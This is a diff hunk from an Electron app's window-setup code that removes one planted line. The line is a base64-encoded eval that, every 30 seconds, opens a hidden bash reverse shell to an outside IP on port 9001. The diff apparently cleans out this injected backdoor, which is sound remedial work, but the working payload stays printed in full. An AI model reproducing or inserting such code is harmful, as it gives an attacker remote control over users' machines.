@@ -25,7 +25,6 @@ function createWindows() {
     const vueIndexPath = path.join(__dirname, 'dist', 'index.html');
     console.log('[ELECTRON] Chargement du fichier Vue :', vueIndexPath);
     const fs = require('fs');
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
     if (fs.existsSync(vueIndexPath)) {
       console.log('[ELECTRON] Fichier index.html trouvé, chargement...');
       dashboardWin.loadFile(vueIndexPath);
